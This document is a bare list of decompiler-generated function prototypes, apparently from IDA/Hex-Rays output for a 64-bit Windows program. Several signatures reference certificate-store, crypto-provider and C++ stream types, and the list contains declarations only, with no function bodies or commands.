__int64 __fastcall sub_140027260(__int64 a1);
__int64 __fastcall sub_1400272A0(unsigned __int64 a1);
_DWORD *__fastcall sub_1400273B0();
__int64 __fastcall sub_140027410(int a1, int a2);
__int64 __fastcall sub_140027480(__int64 a1, int a2);
void __fastcall sub_140027530(__int64 a1, int a2);
void __fastcall sub_140027540(__int64 a1, int a2);
__int64 __fastcall sub_140027560(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400275D0(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_140027600(__int64 *a1, __int64 *a2);
void **sub_140027650();
__int64 __fastcall sub_140027660(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140027690(__int64 a1, _BYTE *a2, int a3);
__int64 __fastcall sub_140027770(__int64 a1, __int64 a2, int a3, int a4);
__int64 __fastcall sub_140027860(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_1400278D0(__int64 a1);
_QWORD *__fastcall sub_140027910(__int64 a1, int a2);
_QWORD *__fastcall sub_1400279B0(__int64 a1, int a2);
void __fastcall sub_140027B10(__int64 a1);
_QWORD *__fastcall sub_140027B30(__int64 a1, int a2);
__int64 __fastcall sub_140027B60(__int64 a1);
void __fastcall sub_140027BE0(__int64 a1);
_QWORD *__fastcall sub_140027C40(_DWORD *a1);
_QWORD *__fastcall sub_140027CD0();
__int64 __fastcall sub_140027D40(int *a1);
__int64 *__fastcall sub_140027DB0(__int64 **a1);
_QWORD *__fastcall sub_140027E40(__int64 a1, char a2);
__int64 __fastcall sub_140027F80(__int64 a1, int a2);
__int64 __fastcall sub_140028040(__int64 a1, __int64 a2, __int64 a3, char *a4, size_t a5, int *a6);
__int64 __fastcall sub_140028290(__int64 a1, int a2, int a3, int a4);
__int64 __fastcall sub_1400282C0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400282E0(__int64 a1, int a2, int a3, int a4);
__int64 __fastcall sub_140028310(__int64 a1, __int64 a2);
__int64 __fastcall sub_140028330(int a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140028500(int a1, __int64 a2, int a3, int a4, int a5);
unsigned __int64 __fastcall sub_140028760(int a1);
char *__fastcall sub_140028820(int a1);
__int64 __fastcall sub_140028860(__int64 a1);
__int64 *__fastcall sub_1400288D0(__int64 a1);
__int64 __fastcall sub_140028D30(__int64 *a1, _QWORD *a2, _BYTE *a3, __int64 a4, int *a5);
__int64 __fastcall sub_140028DE0(__int64 a1, _QWORD *a2, int a3, _QWORD *a4, int *a5);
__int64 __fastcall sub_140028EA0(__int64 a1, _QWORD *a2, int a3, _BYTE *a4, unsigned __int64 a5, int *a6);
int *__fastcall sub_140028F50(__int64 *a1, _QWORD *a2, __int64 a3, int a4, int *a5);
int *__fastcall sub_140029000(__int64 *a1, _QWORD *a2, __int64 a3, int a4, int *a5);
__int64 __fastcall sub_1400290B0(void *a1, size_t a2, __int64 a3, __int64 *a4, void (__fastcall *a5)(void *, size_t, void *, size_t *));
char **sub_1400291D0();
__int64 __fastcall sub_1400291E0(__int64 a1);
__int64 __fastcall sub_140029370(int *a1, int a2);
__int64 __fastcall sub_1400293F0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140029490(int *a1, __int64 a2);
void __fastcall sub_1400294B0(void **a1);
__int64 __fastcall sub_140029500(int *a1, __int64 a2, int a3);
__int64 __fastcall sub_140029620(__int64 a1);
_QWORD *__fastcall sub_140029630(__int64 a1);
_QWORD *sub_1400296C0();
__int64 __fastcall sub_1400296E0(unsigned int *a1);
__int64 __fastcall sub_1400296F0(int *a1);
void __fastcall sub_140029720(void *a1, void (*a2)(void));
__int64 __fastcall sub_1400297C0(int *a1, __int64 a2);
__int64 __fastcall sub_1400297E0(__int64 a1, int a2, __int64 a3);
__int64 __fastcall sub_140029810(__int64 a1, __int64 a2);
void __fastcall sub_140029830(int *a1);
__int64 __fastcall sub_140029880(__int64 a1, int a2);
__int64 __fastcall sub_1400298A0(int *a1, __int64 a2, char a3);
__int64 __fastcall sub_140029970(_QWORD *a1, unsigned int a2, __int64 a3);
void __fastcall sub_140029A60(__int64 a1, int a2);
__int64 __fastcall sub_140029A70(__int64 a1);
__int64 __fastcall sub_140029A90(_QWORD *a1, unsigned int a2, unsigned int a3, __int64 a4);
int **__fastcall sub_140029B70(int *a1, int a2);
__int64 __fastcall sub_140029BA0(__int64 a1);
void __fastcall sub_140029C60(__int64 a1);
__int64 __fastcall sub_140029D50(__int64 a1);
__int64 __fastcall sub_140029D60(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_140029E80(__int64 a1, int a2, int a3);
__int64 __fastcall sub_140029FB0(_QWORD *a1, unsigned int a2, unsigned int a3, int a4);
__int64 *__fastcall sub_140029FE0(__int64 a1);
__int64 __fastcall sub_14002A130(__int64 a1);
_QWORD *__fastcall sub_14002A140(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_14002A1A0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14002A2C0(__int64 a1, __int64 a2, unsigned int a3);
void __fastcall sub_14002A3F0(__int64 a1, __int64 a2);
void __fastcall sub_14002A400(__int64 a1, int a2);
void __fastcall sub_14002A410(__int64 a1, int a2);
__int64 __fastcall sub_14002A420(__int64 a1, unsigned int a2);
__int64 __fastcall sub_14002A430(__int64 a1, __int64 a2, unsigned int a3);
void sub_14002A540();
__int64 sub_14002A590(__int64 a1, char *a2, ...);
__int64 sub_14002A5C0(const void *a1, unsigned __int64 a2, char *a3, ...);
__int64 __fastcall sub_14002A640(__int64 a1, char *a2, int *a3);
__int64 __fastcall sub_14002A730(const void **a1, void **a2, unsigned __int64 *a3, _QWORD *a4, _DWORD *a5, char *a6, int *a7);
__int64 __fastcall sub_14002AE50(const void **a1, void **a2, size_t *a3, unsigned __int64 *a4, char a5);
__int64 __fastcall sub_14002AFB0(const void **a1, void **a2, size_t *a3, unsigned __int64 *a4, double a5, int a6, int a7, char a8, int a9);
__int64 __fastcall sub_14002B660(const void **a1, void **a2, size_t *a3, unsigned __int64 *a4, __int64 a5, unsigned int a6, int a7, int a8, char a9);
__int64 __fastcall sub_14002B940(const void **a1, void **a2, size_t *a3, unsigned __int64 *a4, char *a5, char a6, int a7, int a8);
__int64 __fastcall sub_14002BAC0(__int64 a1);
__int64 __fastcall sub_14002BCB0(__int64 a1, __int64 a2, int a3, int a4, __int64 (__fastcall *a5)(__int64, __int64));
__int64 __fastcall sub_14002BCE0(__int64 a1, __int64 a2, int a3, int a4, __int64 (__fastcall *a5)(__int64, __int64), char a6);
__int64 __fastcall sub_14002BDE0(char *a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14002BEF0(__int64 a1);
__int64 __fastcall sub_14002BF00(__int64 a1);
__int64 __fastcall sub_14002BF10(__int64 a1);
char *__fastcall sub_14002C030(unsigned int a1);
char **__fastcall sub_14002C0F0(unsigned int a1);
char *__fastcall sub_14002C1A0(unsigned int a1);
__int64 __fastcall sub_14002C260(__int64 a1);
__int64 __fastcall sub_14002C3A0(_BYTE *a1, int a2, __int64 a3, int a4);
__int64 __fastcall sub_14002C720(__int64 a1);
char **__fastcall sub_14002C840(char *a1, int a2);
int __fastcall sub_14002C970(int *a1, __int64 a2);
__int64 __fastcall sub_14002CA60(__int64 a1);
__int64 __fastcall sub_14002CB20(__int64 a1);
__int64 __fastcall sub_14002CB40(__int64 a1);
void __fastcall sub_14002CB50(__int64 *a1);
void sub_14002CB90();
__int64 __fastcall sub_14002CC10(__int64 *a1, int a2);
__int64 __fastcall sub_14002CD10(_QWORD *a1, const char *a2, int a3);
void __fastcall sub_14002CE80(__int64 a1);
void __fastcall sub_14002CEF0(__int64 a1);
char **sub_14002D000();
__int64 __fastcall sub_14002D030(__int64 a1, int a2);
__int64 sub_14002D050();
__int64 __fastcall sub_14002D070(__int64 a1);
__int64 __fastcall sub_14002D220(__int64 a1);
__int64 __fastcall sub_14002D250(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14002D2F0(__int64 a1, int a2, __int64 a3);
void __fastcall sub_14002D310(__int64 a1);
char **sub_14002D400();
__int64 sub_14002D430();
__int64 __fastcall sub_14002D450(__int64 a1);
__int64 __fastcall sub_14002D5F0(__int64 a1);
__int64 __fastcall sub_14002D640(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14002D6C0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14002D770(__int64 a1);
__int64 __fastcall sub_14002D7A0(__int64 a1);
__int64 __fastcall sub_14002D7C0(_QWORD *a1);
void __fastcall sub_14002D940(__int64 a1);
__int64 __fastcall sub_14002DA00(__int64 a1);
char **sub_14002DA10();
__int64 __fastcall sub_14002DA40(__int64 a1, int a2);
__int64 sub_14002DA60();
__int64 __fastcall sub_14002DA80(__int64 a1);
__int64 __fastcall sub_14002DC20(__int64 a1);
__int64 __fastcall sub_14002DC80(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14002DD20(__int64 a1, int a2, __int64 a3);
__int64 __fastcall sub_14002DD40(__int64 a1);
__int64 __fastcall sub_14002DDA0(unsigned int a1, int a2, __int64 a3);
__int64 __fastcall sub_14002DE40(unsigned int *a1);
void __fastcall sub_14002DE60(unsigned int *a1);
void *sub_14002DE80();
__int64 sub_14002DE90();
_BOOL8 sub_14002DEB0();
_BOOL8 sub_14002E830();
__int64 __fastcall sub_14002E970(char *a1);
void sub_14002E9C0();
_BYTE *sub_14002E9D0();
_BOOL8 __fastcall sub_14002EAE0(_BYTE *a1, __int64 a2, __int64 a3);
void sub_14002EB10();
__int64 __fastcall sub_14002EBE0(__int64 a1, char *a2, char a3);
__int64 __fastcall sub_14002ECD0(_BYTE *a1, char *a2, char a3);
void __fastcall sub_14002EDB0(int a1);
__int64 __fastcall sub_14002EEA0(const char *a1, int a2, int a3, __int64 (__fastcall *a4)(const char *, __int64, __int64), __int64 a5);
void sub_14002EFF0();
_QWORD *__fastcall sub_14002F010(__int64 a1, _BYTE *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14002F110(const char *a1);
__int64 __fastcall sub_14002F1E0(__int64 a1, _BYTE *a2, _BYTE *a3, __int64 a4);
_QWORD *__fastcall sub_14002F380(__int64 a1, _BYTE *a2, const char *a3);
__int64 __fastcall sub_14002F490(__int64 a1, char *a2, char *a3, char a4);
__int64 sub_14002F5D0();
void sub_14002F610();
__int64 sub_14002F640();
__int64 sub_14002F690();
void __fastcall sub_14002F6C0(int **a1);
void __fastcall sub_14002F740(int **a1);
__int64 sub_14002F7E0();
__int64 sub_14002F820();
__int64 sub_14002F870();
_BOOL8 __fastcall sub_14002F900(__int64 a1, __int16 a2);
_BOOL8 __fastcall sub_14002F9E0(__int64 a1, const char *a2);
__int64 __fastcall sub_14002FA80(const char *a1, int a2, _DWORD *a3);
_BOOL8 __fastcall sub_14002FCD0(_QWORD *a1);
void sub_14002FDE0();
__int64 __fastcall sub_14002FE40(__int64 a1, __int64 *a2, _QWORD *a3, int a4);
__int64 sub_14002FEB0();
__int64 __fastcall sub_14002FF10(__int64 a1, __int64 *a2, _QWORD *a3, int a4);
__int64 *__fastcall sub_14002FF60(__int64 a1, const char *a2);
__int64 __fastcall sub_14002FFE0(_QWORD *a1);
__int64 __fastcall sub_140030090(_QWORD *a1);
__int64 sub_140030120();
__int64 sub_1400301D0();
__int64 __fastcall sub_140030280(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4);
__int64 __fastcall sub_1400302D0(__int64 a1, const void *a2);
__int64 __fastcall sub_140030370(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_1400303A0(__int64 a1);
__int64 __fastcall sub_1400303C0(__int64 a1, unsigned int *a2, size_t a3);
__int64 sub_140030400();
__int64 __fastcall sub_1400304D0(__int64 a1, int a2, unsigned int a3, _BYTE *a4);
void __fastcall sub_1400307D0(__int64 a1, void **a2);
__int64 __fastcall sub_140030850(__int64 a1);
__int64 __fastcall sub_140030930(__int64 a1, __int64 a2);
__int64 __fastcall sub_140030C70(__int64 a1, __int64 *a2);
__int64 sub_140030DD0();
void sub_140030E90();
void __fastcall sub_140030ED0(void *a1);
__int64 __fastcall sub_140030F00(__int64 *a1);
void sub_140031000(__int64 a1, char *a2, ...);
__int64 __fastcall sub_140031040(_QWORD *a1);
void __fastcall sub_140031220(unsigned int a1);
void sub_140031280();
CHAR *__fastcall sub_1400312F0(__int64 a1, const CERT_CONTEXT *a2);
__int64 __fastcall sub_140031400(__int64 a1, int a2, DWORD a3, _BYTE *a4);
void __fastcall sub_1400317E0(void **a1);
_DWORD *__fastcall sub_140031880();
__int64 __fastcall sub_140031920(__int64 a1, char *a2, DWORD a3, int a4);
__int64 sub_140031AF0();
__int64 **__fastcall sub_140031B70(const BYTE *a1, int a2, __int64 a3);
__int64 __fastcall sub_140031ED0(__int64 a1);
void __fastcall sub_140031F60(__int64 a1, __int64 a2, const CERT_CONTEXT *a3);
void __fastcall sub_1400320F0(__int64 a1, __int64 a2, __int64 a3);
PCCERT_CONTEXT __fastcall sub_1400321D0(__int64 a1, const void *pvFindPara, void *a3);
HCRYPTPROV *__fastcall sub_1400323D0(__int64 a1, const void *a2);
__int64 __fastcall sub_140032590(__int64 a1);
void __fastcall sub_1400325E0(__int64 a1);
HCRYPTPROV *__fastcall sub_140032640(__int64 a1, const CERT_CONTEXT *a2);
HCRYPTPROV *__fastcall sub_1400326B0(__int64 a1, const WCHAR *a2, const WCHAR *a3, DWORD a4, DWORD dwKeySpec);
_DWORD *__fastcall sub_1400328C0(__int64 a1, __int64 a2);
void *__fastcall sub_140032E00(__int64 a1, const CERT_CONTEXT *a2);
__int64 __fastcall sub_140032F20(__int64 a1, const char **a2, DWORD *a3, DWORD a4);
__int64 __fastcall sub_140033120(__int64 a1);
HCERTSTORE __fastcall sub_140033400(__int64 a1, __int64 a2, const void *a3);
__int64 __fastcall sub_140033520(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400338A0(__int64 a1, __int64 a2);
_DWORD *__fastcall sub_140033B40(__int64 a1, const void *a2);
__int64 __fastcall sub_140033BF0(__int64 a1, __int64 a2, unsigned int *a3, __int64 *a4, _QWORD *a5);
HCERTSTORE __fastcall sub_140033EC0(__int64 a1, const char *a2);
__int64 __fastcall sub_140033F70(__int64 a1);
__int64 __fastcall sub_140034000(int a1, __int64 a2, void *a3, __int64 a4, unsigned int a5);
__int64 sub_140034280();
__int64 __fastcall sub_1400342D0(int a1, const BYTE *a2, __int64 a3, BYTE *a4, DWORD *a5, __int64 a6);
void __fastcall sub_1400345F0(__int64 a1, int a2, char *a3, int *a4);
__int64 __fastcall sub_1400346B0(unsigned int *a1, __int64 a2);
void sub_140034750();
_BOOL8 __fastcall sub_1400347B0(__int64 a1, char *a2, int a3);
CHAR *__fastcall sub_140034820(const WCHAR *a1);
__int64 __fastcall sub_1400349C0(__int64 a1);
__int64 __fastcall sub_140034A50(__int64 a1, int a2);
void *sub_140034A70();
void *sub_140034A80();
__int64 __fastcall sub_140034B40(__int64 a1, __int64 a2);
__int64 __fastcall sub_140034B50(__int64 a1, __int64 a2);
__int64 __fastcall sub_140034B60(__int64 a1, __int64 a2);
__int64 __fastcall sub_140034B70(__int64 a1, int a2, __int64 a3);
__int64 __fastcall sub_140034B90(__int64 a1, __int64 a2);
__int64 __fastcall sub_140034BA0(__int64 a1, int a2);
__int64 __fastcall sub_140034BB0(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_140034C00(__int64 a1, __int64 a2);
__int64 __fastcall sub_140034C10(__int64 a1, __int64 a2);
_DWORD *sub_140034C60();
_QWORD *__fastcall sub_140034CA0(__int64 a1);
_QWORD *__fastcall sub_140034D10(__int64 a1);
void __fastcall sub_140034D80(void (**a1)(void));
void sub_140034DB0();
__int64 __fastcall sub_140034DF0(__int64 a1, int a2);
__int64 __fastcall sub_140034EA0(__int64 a1);
_BOOL8 sub_140034EF0();
__int64 __fastcall sub_140035050(__int64 a1, __int64 a2);
void *__fastcall sub_1400350D0(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_140035180(_DWORD *a1, unsigned int a2, int a3);
_QWORD *__fastcall sub_140035230(__int64 a1, int a2);
__int64 __fastcall sub_1400352F0(void *a1);
_QWORD *__fastcall sub_140035410(_QWORD *a1, _BYTE *a2, __int64 a3, int a4);
__int64 __fastcall sub_140035540(__int64 a1, __int64 a2, __int64 a3);
void *sub_1400355C0();
void *sub_1400355E0();
__int64 __fastcall sub_140035710(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_1400357A0(__int64 a1, _BYTE *a2);
_BOOL8 __fastcall sub_1400358A0(__int64 a1, int a2, __int64 a3);
void __fastcall sub_1400359D0(int a1);
__int64 __fastcall sub_140035A70(__int64 a1, int a2);
_BOOL8 sub_140035B40();
__int64 __fastcall sub_140035BA0(__int64 a1, int a2);
void __fastcall sub_140035C50(void *a1);
void __fastcall sub_140035C80(__int64 a1);
__int64 __fastcall sub_140035CB0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140035D40(__int64 a1);
__int64 __fastcall sub_140035DA0(int a1, _DWORD *a2, _DWORD *a3);
__int64 __fastcall sub_140035E60(_DWORD *a1, int a2, int a3);
void sub_140035F30();
void __fastcall sub_140035F80(void *a1);
__int64 __fastcall sub_140035FB0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140035FD0(__int64 a1, _BYTE *a2, unsigned int a3, __int64 a4, __int64 a5, int a6);
void sub_140036240();
__int64 __fastcall sub_140036270(int a1, int a2, _DWORD *a3, _DWORD *a4, _QWORD *a5);
void __fastcall sub_140036340(void *a1);
__int64 __fastcall sub_140036370(_DWORD *a1, _DWORD *a2);
__int64 __fastcall sub_140036380(__int64 a1);
_DWORD *__fastcall sub_1400363C0(__int64 a1, __int64 a2);
void __fastcall sub_140036420(__int64 a1);
__int64 __fastcall sub_140036440(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400364C0(__int64 a1, struct std::ios_base *a2);
__int64 __fastcall sub_140036500(__int64 a1, __int64 a2, _QWORD *a3);
__int64 __fastcall sub_140036520(__int64 *a1, int a2, __int64 a3, int *a4);
__int64 __fastcall sub_1400365C0(__int64 a1, __int64 a2, char *a3);
_BOOL8 __fastcall sub_1400366C0(std::ios_base *a1, char *a2, size_t a3);
__int64 __fastcall sub_140036710(__int64 a1);
void __fastcall sub_140036780(__int64 a1);
__int64 __fastcall sub_1400367E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400368B0(__int64 a1, int a2, int a3, _QWORD *a4);
__int64 __fastcall sub_140036B70(__int64 *a1, const char *a2, __int64 a3);
__int64 __fastcall sub_140036D30(__int64 a1, __int64 a2);
__int64 __fastcall sub_140036EA0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140036F30(_QWORD *a1, char *a2, size_t *a3);
_DWORD **__fastcall sub_1400370F0(int *a1, __int64 a2);
__int64 __fastcall sub_140037230(__int64 a1);
__int64 __fastcall sub_1400372A0(__int64 a1, __int64 a2);
void __fastcall sub_140037340(__int64 a1);
__int64 __fastcall sub_140037370(__int64 a1, __int64 a2, _QWORD *a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_140037420(__int64 a1, char *a2, unsigned int a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_1400374B0(__int64 a1, int a2, int a3, unsigned int *a4);
__int64 __fastcall sub_1400376D0(__int64 *a1, const char *a2, __int64 a3);
__int64 __fastcall sub_140037800(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400378F0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140037980(__int64 a1);
__int64 __fastcall sub_1400379D0(__int64 a1, __int64 a2);
void __fastcall sub_140037AD0(__int64 a1);
__int64 __fastcall sub_140037B30(__int64 a1, __int64 a2, _QWORD *a3, __int64 a4, unsigned int a5);
__int64 __fastcall sub_140037C10(__int64 a1, __int64 a2, int a3, __int64 a4, unsigned int a5);
__int64 __fastcall sub_140037C90(_QWORD *a1, void *a2, size_t *a3);
__int64 __fastcall sub_140037E00(__int64 a1, int a2, int a3, unsigned int *a4);
__int64 __fastcall sub_140038290(__int64 *a1, const char *a2, const char *a3);
__int64 **__fastcall sub_1400384B0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140038570(__int64 a1, __int64 a2);
__int64 __fastcall sub_140038640(_QWORD *a1, void *a2, size_t *a3);
__int64 __fastcall sub_140038740(__int64 a1, __int64 a2);
__int64 __fastcall sub_140038830(__int64 a1, __int64 a2);
__int64 __fastcall sub_140038890(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400388D0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140038980(__int64 a1, __int64 a2);
__int64 sub_140038AC0();
__int64 sub_140038AD0();
void __fastcall sub_140038AE0(__int64 a1);
_BOOL8 __fastcall sub_140038B30(__int64 a1, __int64 a2, unsigned int a3, __int64 a4);
_BOOL8 __fastcall sub_140038B50(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_140038C20(__int64 a1, int a2, int a3, __int64 a4);
__int64 __fastcall sub_140038D50(__int64 a1, __int64 a2);
__int64 __fastcall sub_140038D80(__int64 a1, _BYTE *a2, _QWORD *a3);
__int64 __fastcall sub_140038E30(__int64 a1, int a2);
__int64 __fastcall sub_140038E50(__int64 a1, _QWORD *a2, _OWORD *a3, int a4, int a5);
_BOOL8 __fastcall sub_140039030(__int64 a1, __int64 a2, unsigned int a3, __int64 a4, int a5);
__int64 __fastcall sub_140039190(__int64 a1, __int64 a2, char *a3);
__int64 __fastcall sub_140039220(__int64 a1);
void __fastcall sub_1400392B0(std::ios_base *a1);
__int64 __fastcall sub_140039320(std::ios_base *a1, std::ios_base *a2);
__int64 __fastcall sub_1400393D0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140039420(__int64 a1, struct std::ios_base *a2);
__int64 __fastcall sub_140039480(__int64 a1, __int64 a2, _QWORD *a3, __int64 a4);
__int64 __fastcall sub_140039510(__int64 *a1, int a2, int a3, _BYTE *a4);
_BOOL8 __fastcall sub_1400395A0(std::ios_base *a1);
__int64 __fastcall sub_1400395F0(__int64 a1, void *a2, _QWORD *a3, __int64 a4, unsigned int a5);
__int64 __fastcall sub_140039710(__int64 a1, int a2, int a3, unsigned int *a4);
__int64 __fastcall sub_140039AE0(__int64 *a1, const char *a2, char *a3);
__int64 __fastcall sub_140039F70(__int64 a1, __int64 a2);
__int64 __fastcall sub_14003A070(__int64 a1);
__int64 __fastcall sub_14003A0E0(__int64 a1, __int64 a2);
void __fastcall sub_14003A1F0(__int64 a1);
__int64 __fastcall sub_14003A260(__int64 a1, __int64 a2, _QWORD *a3, const void *a4, size_t Size);
__int64 __fastcall sub_14003A4D0(__int64 a1, _OWORD *a2, _QWORD *a3, __int64 a4, size_t a5);
__int64 __fastcall sub_14003A690(__int64 a1, __int64 a2, size_t a3, _QWORD *a4, __int64 a5);
__int64 __fastcall sub_14003A860(__int64 a1, __int64 a2, _QWORD *a3, const void *a4, unsigned int a5);
__int64 __fastcall sub_14003A980(unsigned int *a1, int a2);
_BOOL8 __fastcall sub_14003AA60(__int64 a1, __int64 a2);
__int64 __fastcall sub_14003AAC0(__int64 a1);
void __fastcall sub_14003AB10(__int64 a1);
__int64 __fastcall sub_14003AB70(__int64 a1, int a2, int a3, const void *a4);
__int64 __fastcall sub_14003ACA0(__int64 a1, __int64 a2, char *a3);
__int64 __fastcall sub_14003AE40(__int64 a1, char *a2, size_t *a3);
__int64 __fastcall sub_14003AEC0(int *a1, __int64 a2, unsigned int a3, __int64 a4, __int64 a5, char *a6, size_t Size);
__int64 __fastcall sub_14003B140(int *a1, __int64 a2, unsigned __int64 a3, __int64 a4, __int64 a5, char *a6, size_t Size);
__int64 __fastcall sub_14003B370(__int64 a1);
void __fastcall sub_14003B3C0(__int64 a1);
__int64 __fastcall sub_14003B430(__int64 a1, int a2, int a3, const void *a4);
__int64 __fastcall sub_14003B5B0(__int64 *a1, _BYTE *a2, char *a3);
_BOOL8 __fastcall sub_14003B7A0(__int64 a1, __int64 a2, unsigned __int64 *a3);
void *__fastcall sub_14003B820(int *a1, const void *a2, int a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, __int64 a8, unsigned __int64 a9);
__int64 __fastcall sub_14003B8E0(int *a1, const void *a2, int a3, __int64 a4, __int64 a5, __int64 a6, unsigned __int64 a7);
void *__fastcall sub_14003BAB0(const void *a1, size_t a2);
void *__fastcall sub_14003BB60(_BYTE *a1);
_BYTE *__fastcall sub_14003BBE0(_BYTE *a1, __int64 a2);
_BYTE *__fastcall sub_14003BC70(unsigned __int8 *a1, unsigned int a2);
__int64 __fastcall sub_14003BD50(char a1);
void *__fastcall sub_14003BE60(char *a1, _DWORD *a2);
__int64 __fastcall sub_14003BFE0(_BYTE *a1, _BYTE *a2, unsigned __int64 a3);
__int64 __fastcall sub_14003C060(_BYTE *a1, _BYTE *a2, unsigned __int64 a3);
_BYTE *__fastcall sub_14003C0C0(_BYTE *a1, __int64 a2);
_BOOL8 __fastcall sub_14003C0E0(int a1, char *a2, size_t a3);
__int64 __fastcall sub_14003C110(__int64 a1, unsigned int a2);
__int64 __fastcall sub_14003C170(int a1);
__int64 __fastcall sub_14003C190(__int64 a1);
__int64 __fastcall sub_14003C200(__int64 a1);
void __fastcall sub_14003C270(__int64 a1);
__int64 sub_14003C2F0();
__int64 __fastcall sub_14003C310(__int64 a1, __int64 a2);
void __fastcall sub_14003C3A0(__int64 a1);
_DWORD *__fastcall sub_14003C400();
__int64 __fastcall sub_14003C480(__int64 a1, __int64 **a2, int *a3);
__int64 __fastcall sub_14003C690(__int64 *a1, _DWORD *a2, __int64 **a3, int *a4);
__int64 __fastcall sub_14003C750(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_14003C7E0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14003CA60(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_14003CB20(__int64 a1);
void __fastcall sub_14003CB60(__int64 a1);
_QWORD *__fastcall sub_14003CC10(__int64 a1);
_BOOL8 __fastcall sub_14003CD00(__int64 a1);
__int64 __fastcall sub_14003CD20(__FrameHandler3::TryBlockMap *a1, _QWORD *a2, __int64 a3, unsigned __int64 a4, __int64 a5, __int64 *a6, __int64 a7);
__int64 *__fastcall sub_14003DA00(__int64 a1, int *a2);
size_t __fastcall sub_14003DE80(__int64 a1, const void *a2, unsigned int a3);
__int64 __fastcall sub_14003DED0(__int64 a1, void *a2, int a3);
size_t __fastcall sub_14003DF90(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_14003E000(__int64 a1, _BYTE *a2, unsigned int a3);
__int64 __fastcall sub_14003E060(__int64 a1, int a2, int a3, FILE *a4);
__int64 __fastcall sub_14003E3C0(__int64 a1);
__int64 __fastcall sub_14003E3E0(__int64 a1);
__int64 *__fastcall sub_14003E440(const CHAR *a1, const char *a2);
__int64 *__fastcall sub_14003E580(__int64 a1, unsigned int a2);
__int64 __fastcall sub_14003E600(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_14003E710(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_14003E820(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_14003E8F0(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_14003E980(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_14003EAA0(__int64 a1, __int64 a2);
void __fastcall sub_14003EBA0(__int64 a1, void (__fastcall *a2)(_QWORD));
void __fastcall sub_14003EC10(__int64 a1, void (__fastcall *a2)(_QWORD, __int64), __int64 a3);
void __fastcall sub_14003ECA0(__int64 a1);
__int64 __fastcall sub_14003ED40(__int64 a1);
_QWORD *__fastcall sub_14003ED50(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_14003EE70(__int64 (__fastcall *a1)(char *a1), int (__cdecl *a2)(const char *Str1, const char *Str2));
_QWORD *__fastcall sub_14003EF50(__int64 a1, __int64 a2);
void __fastcall sub_14003F010(__int64 a1, int a2);
__int64 __fastcall sub_14003F020(char *a1);
__int64 *__fastcall sub_14003F080(__int64 **a1);
__int64 __fastcall sub_14003F150(__int64 a1);
__int64 __fastcall sub_14003F270(_QWORD *a1);
_DWORD *__fastcall sub_14003F290(__int64 a1, unsigned int *a2, __int64 *a3);
__int64 __fastcall sub_14003F350(__int64 a1, int a2, __int64 a3);
__int64 __fastcall sub_14003F3C0(__int64 a1, int a2, __int64 a3);
__int64 __fastcall sub_14003F490(__int64 a1, __int64 a2);
void __fastcall sub_14003F4D0(__int64 a1);
_DWORD *__fastcall sub_14003F580();
__int64 __fastcall sub_14003F5E0(__int64 a1, int a2, char *a3, int a4);
char **__fastcall sub_14003FA20(__int64 *a1, char **a2, int a3);
char **__fastcall sub_14003FC70(__int64 *a1, _BYTE **a2, int a3);
__int64 __fastcall sub_14003FD20(__int64 a1, __int64 a2);
__int64 __fastcall sub_14003FE60(_BYTE *a1, int a2, __int64 a3);
__int64 __fastcall sub_14003FE80(__int64 a1, _DWORD *a2, void *a3, signed int a4);
__int64 __fastcall sub_14003FF60(__int64 a1, void *a2, int a3);
_BOOL8 __fastcall sub_140040010(__int64 a1, unsigned int a2, __int64 a3, int a4);
__int64 __fastcall sub_140040070(__int64 a1, _BYTE *a2, int a3);
void sub_1400400F0();
__int64 __fastcall sub_140040170(__int64 a1, int a2);
__int64 __fastcall sub_140040190(__int64 a1, int a2, double a3);
__int64 __fastcall sub_1400405C0(_BYTE *a1, int a2);
__int64 __fastcall sub_1400405E0(_BYTE *a1, int a2);
_BOOL8 sub_140040600();
__int64 (__fastcall **sub_140040720())();
_DWORD *sub_140040730();
